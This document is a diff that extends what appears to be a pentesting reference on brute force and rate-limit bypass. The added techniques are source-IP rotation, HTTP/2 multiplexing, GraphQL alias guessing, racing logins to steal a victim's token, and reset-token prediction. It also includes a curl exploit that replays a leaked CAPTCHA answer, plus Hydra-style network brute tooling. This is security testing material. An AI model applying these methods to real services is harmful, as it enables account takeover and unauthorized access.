@@ -165,3 +165,77 @@ done
 - Login brute force → credential stuffing
 - Password reset abuse → spam/DoS
 - API abuse → data harvesting, cost increase
+
+
+## Additional Techniques — ported from WebSkills (writeup-techniques/brute-force)
+
+The core file covers header-spoof, request/endpoint variation, session tricks, OTP brute, and the impact gate. The items below are attack-primitive and tooling techniques from the accepted-writeup corpus that are not otherwise represented.
+
+### Disposable-egress-IP rotation infra (defeat *real* source-IP throttles)
+Header spoofing only works when the limiter trusts a client header. When it keys on the true TCP source IP, rotate the actual egress:
+```
+fireprox                    # spins up disposable AWS API Gateway endpoints; every request egresses from a fresh IP
+Burp IPRotate+ (extension)  # transparently rotates source IP through AWS API Gateway / proxy pool in Intruder/Turbo Intruder
+IP-Rotator                  # same primitive; commonly paired with reset-token brute-force to beat per-IP throttle
+```
+Also seen: put the *guessed value itself* in `X-Forwarded-For` so every attempt presents a unique "IP" and the counter never trips (Bludit CVE-2019-17240 exploit puts each candidate password in XFF). Extra headers to try beyond the core list: `X-Remote-Addr`, `X-Host`, `X-Forwarded-Host`, `X-Custom-IP-Authorization: 127.0.0.1`.
+
+### HTTP/2 single-packet / multiplexing to collapse the request count
+Per-connection or request-count throttles fall to HTTP/2 multiplexing — many attempts ride one connection the limiter counts once:
+```
+Turbo Intruder (HTTP/2)  → concurrency 100–1000, collapses hundreds of requests into a single connection
+HTTP/2 single-packet attack (PortSwigger "HTTP/2: The Sequel is Always Worse") → beats per-connection limits and races the attempt-counter
+```
+
+### GraphQL aliasing — thousands of guesses in ONE counted request
+When the target exposes a GraphQL mutation for verify/login, alias the same mutation N times in a single HTTP request; the rate limiter counts one request (PortSwigger "Bypassing rate limits with GraphQL aliasing"):
+```graphql
+mutation {
+  a: verifyOtp(code:"0000"){ ok }
+  b: verifyOtp(code:"0001"){ ok }
+  c: verifyOtp(code:"0002"){ ok }
+  # ... thousands of aliases → limiter counts this as a single request
+}
+```
+
+### Race on login → steal + plant the victim's token → ATO
+Beyond racing the attempt-counter: fire many login requests with random creds so a request-handling race lets you capture a *legitimate* user's issued token when they log in, then plant it. OpenNebula pattern — steal the victim JWT during the race and set it client-side:
+```
+Application → Storage → Local Storage → FireedgeToken → replace with stolen token → refresh → full access
+```
+
+### Decoy requests to poison the rate-limit heuristic
+Interleave dummy/benign requests among the real brute attempts so a heuristic limiter mis-classifies the pattern and the real guesses slip under the threshold (HackTricks 2FA "Decoy Requests").
+
+### "Silent" rate limit — always send the correct value under the block
+Even when a limiter *appears* active (429s, lockout banner), keep submitting the correct credential/OTP anyway and diff the response — the "limit" is often cosmetic and the valid value still returns success. One documented case: after 20 failures the server returned `401` for wrong OTPs but still returned `200` for the valid one. Detection: send the known-good value while "blocked" and compare status/length/body.
+
+### CAPTCHA answer leaked in the response (read-and-replay)
+Some CAPTCHA/verify endpoints return the secret they are supposed to validate. Request the code object, read it, replay it — no solving needed (iDS6 DSSPro `autoLoginVerifyCode`, EDB-48991):
+```
+$ curl -i 'http://target/Pages/login!autoLoginVerifyCode' -c cookies.txt
+{"success":true,"message":"6435","data":"6435"}        # CAPTCHA answer echoed in JSON
+$ curl -i 'http://target/Pages/login!userValidate' -b cookies.txt \
+    -d "user.userName=boss&user.password=boss&loginVerifyCode=6435..."
+{"success":true}
+```
+Generalize: diff every verify/reset/redirect/email-preview/JS response for the secret it echoes.
+
+### Predictable / brute-forceable reset token — generation-scheme analysis
+When a reset link/code is guessable, reverse the generation scheme and predict rather than brute:
+```
+Token derived from: Timestamp | UserID | email | Firstname+Lastname | DoB | weak crypto
+UUIDv1 → predictable  → guidtool
+Collect many tokens   → Burp Sequencer (entropy analysis)
+```
+Also: **use your own valid token with the victim's email** (token not bound to the initiating user); replay an **expired token** (often still accepted); brute the token with IP-Rotator to beat the per-IP throttle.
+
+### Non-web / network-service brute tooling
+The corpus extends past HTTP auth — same throttle-absence bugs on network services and default creds:
+```
+Hydra / Medusa / ncrack          # RDP, SMB, LDAP, FTP, VNC, SSH brute
+WPS 8-digit PIN                  # only ~11,000 combinations
+DefaultCreds-cheat-sheet / SecLists default-passwords.csv   # default creds first
+crunch / CUPP / Wister / CeWL    # targeted dictionary from OSINT
+```
+Precede with a **user-enumeration oracle** (login/response differential, PII leak) to narrow the username list before spraying.
